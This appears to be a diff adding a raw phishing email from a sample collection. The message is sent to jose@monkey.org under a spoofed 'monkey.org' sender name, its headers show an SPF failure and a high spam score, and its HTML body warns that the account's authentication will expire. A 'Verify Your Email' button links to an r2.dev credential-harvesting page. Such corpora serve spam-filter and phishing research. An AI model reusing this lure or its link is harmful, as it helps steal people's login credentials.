@@ -1,0 +1,111 @@
+Return-Path: dariusz.mizera@poczta.pl
+Delivered-To: jose@monkey.org
+X-FDA: 82025106912.29.09298D0
+Received: from v136.home.net.pl (v136.home.net.pl [79.96.241.136])
+	by imf15.b.hostedemail.com (Postfix) with ESMTP id 685CF60003
+	for <jose@monkey.org>; Fri, 19 Apr 2024 05:10:52 +0000 (UTC)
+Authentication-Results: imf15.b.hostedemail.com;	dkim=none;	spf=fail
+ (imf15.b.hostedemail.com: domain of dariusz.mizera@poczta.pl does not
+ designate 79.96.241.136 as permitted sender)
+ smtp.mailfrom=dariusz.mizera@poczta.pl;	dmarc=none
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1713503455; a=rsa-sha256;
+	cv=none;
+	b=33sZxqOxWcig+hEDHtJ2lWo+ChSA/r37H2yOCA2fS4f/s7TO89uLYBxzocUybbs2f9jqRI
+	5g6wxeQWNw+RoqCKsEYa9D83iUVunBthO/HF+sG8hvucGpuvOB411uSwpgx62TbPrEZtSv
+	iRrseJyX4KwH3oGq4fTdSF4VlQUyDVw=
+ARC-Authentication-Results: i=1;	imf15.b.hostedemail.com;	dkim=none;	spf=fail
+ (imf15.b.hostedemail.com: domain of dariusz.mizera@poczta.pl does not
+ designate 79.96.241.136 as permitted sender)
+ smtp.mailfrom=dariusz.mizera@poczta.pl;	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1713503455;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	 references;
+ bh=B22IKf7iiMd2BcImsNv3S/lRz+bUNsVL+73IB7PQbeI=;
+	b=D4ChXVN3r1Qd73OckMO6WQRq9j/Z6RWc4bVD+O9HSGyplhkSCEYE/tdv4GsUMs2z3mHljG
+	onXlVpa0Gxa98cIsYb4D09AEueGhOutuLiYnZ+4hplfdI2zcpQF5qaiWGknhOdjhptNdH+
+	gix/yaRSli1ON8itKTsL604aokbQGHY=
+Received: from poczta.pl (unknown [104.219.237.181])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by cloudserver034724.home.pl (Postfix) with ESMTPSA id C35218700FE
+	for <jose@monkey.org>; Fri, 19 Apr 2024 07:10:49 +0200 (CEST)
+From: monkey.org <dariusz.mizera@poczta.pl>
+To: jose@monkey.org
+Subject: jose@monkey.org username authentication will expired on 19 Apr 2024 
+Date: 18 Apr 2024 22:10:48 -0700
+Message-ID: <20240418221024.1ABD5EA197B8C582@poczta.pl>
+MIME-Version: 1.0
+Disposition-Notification-To: agabnon@gmail.com
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+X-CLIENT-IP: 104.219.237.181
+X-CLIENT-HOSTNAME: 104.219.237.181
+X-VADE-SPAMSTATE: spam:medium
+X-VADE-SPAMCAUSE: =?utf-8?q?gggruggvucftvghtrhhoucdtuddrgedvledrudekuddgkeej?=
+ =?utf-8?q?ucetufdoteggodetrfdotffvucfrrhhofhhilhgvmecujffqoffgrffnpdggtffip?=
+ =?utf-8?q?ffknecuuegrihhlohhuthemucduhedtnecujfgurhcugeeijedvucdlfedttddmne?=
+ =?utf-8?q?cujfgurhephffvufffkfggpfgtgfeshhhqfedttddtnecuhfhrohhmpehmohhnkhg?=
+ =?utf-8?q?vhidrohhrghcuuceouggrrhhiuhhsiidrmhhiiigvrhgrsehpohgtiihtrgdrphhl?=
+ =?utf-8?q?qeenucfkphepuddtgedrvdduledrvdefjedrudekudenucevlhhushhtvghrufhii?=
+ =?utf-8?q?igvpeeinecurfgrrhgrmhepihhnvghtpedutdegrddvudelrddvfeejrddukedupd?=
+ =?utf-8?q?hhvghlohepphhotgiithgrrdhplhdpmhgrihhlfhhrohhmpehmohhnkhgvhidrohh?=
+ =?utf-8?q?rghcuuceouggrrhhiuhhsiidrmhhiiigvrhgrsehpohgtiihtrgdrphhlqedpnhgs?=
+ =?utf-8?q?pghrtghpthhtohepuddprhgtphhtthhopehjohhsvgesmhhonhhkvgihrdhorhhg?=
+X-DCC--Metrics: v136.home.net.pl 1024; Body=1 Fuz1=1 Fuz2=2
+X-Stat-Signature: cspfgwtrndnxgxpwf7qrqg7bkgsqmf6c
+X-Rspam-User: 
+X-Rspamd-Queue-Id: 685CF60003
+X-Rspamd-Server: rspam02
+X-Spam-Status: Yes, score=11.70
+X-HE-Tag: 1713503452-342368
+X-HE-Meta: =?utf-8?q?U2FsdGVkX189b9QX7Ml3/pkwQY/vU8FDpRDv92MI4Fir/VpMWNFo1+j?=
+ =?utf-8?q?vAP2tOm9eV2Do502/gi4Uj+zEwh+7RWRVePUcQ4KK8LTySVXlxV1T/If0ztNI8bka?=
+ =?utf-8?q?2AiRDQwdufbbMYdTU7iF1FTzPH0smhIJoc57HCY6CUD1S80EQvx7afuHEi3+LqK/K?=
+ =?utf-8?q?D1bonZd8/lycXro5QB3ZOzW6XdbrEQzEOoV4nqC2fg3Xy5NV8YY4qp0Yd6sLPZ1IS?=
+ =?utf-8?q?rMkJLr4GVVXzYyAZs9D6apeDp0KnTnWjz/L48B9ONNtlX4xaAMbJFVy4EQjqoNA9A?=
+ =?utf-8?q?bE/KDAzhNr1XonHEoCF4pqdZH0PsKb5GfllVub+Si54tkT+8=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 114
+
+<HTML><HEAD>
+<STYLE type=3Dtext/css>#editbody1 CITE=20
+
+ {
+ FONT-SIZE: 0}
+}
+#editbody1 .v1BDY {font-family:"wf_segoe-ui_normal","Segoe UI","Segoe WP",T=
+ahoma,Arial,sans-serif;
+ font-size: 16px} #editbody1 .v1AOL {font-family:"wf_segoe-ui_normal","Sego=
+e UI","Segoe WP",Tahoma,Arial,sans-serif;
+ font-size: 14px;
+font-weight: 15;
+COLOR:#0f0000} #editbody1 .v1PUC {MIN-WIDTH: 50px;
+PADDING-BOTTOM: 5px;
+PADDING-TOP: 5px;
+PADDING-LEFT: 20px;
+PADDING-RIGHT: 20px;
+BACKGROUND-COLOR:#0f0000}
+#editbody1 .v1TUI {TEXT-DECORATION: none;
+FONT-FAMILY: "Calibri";
+FONT-WEIGHT: 600;
+COLOR: rgb(255, 255, 255);
+TEXT-ALIGN: center}</STYLE>
+
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<body>
+<P><FONT size=3D4>&nbsp;&nbsp;<FONT color=3D#0000ff><STRONG>jose@monkey.org=
+</STRONG></FONT> username authentication&nbsp;<BR>&nbsp;&nbsp;will expired =
+on 19 Apr 2024 Verify Your Email below <BR></FONT><BR>&nbsp;&nbsp;&nbsp;&nb=
+sp;&nbsp;&nbsp;<FONT size=3D4>&nbsp;</FONT><A href=3D"https://pub-0eded1a4a=
+8ae42ca976c4457c86a0532.r2.dev/index.html#jose@monkey.org"><FONT style=3D"B=
+ACKGROUND-COLOR: #0000ff" color=3D#ffffff size=3D5>&nbsp; <STRONG>Verify Yo=
+ur Email</STRONG> &nbsp;&nbsp;&nbsp;</FONT> </A><BR><BR><BR>
+&nbsp; &nbsp;Copyright &copy; 2024 monkey.org All rights reserved.</P></BOD=
+Y></HTML>
+
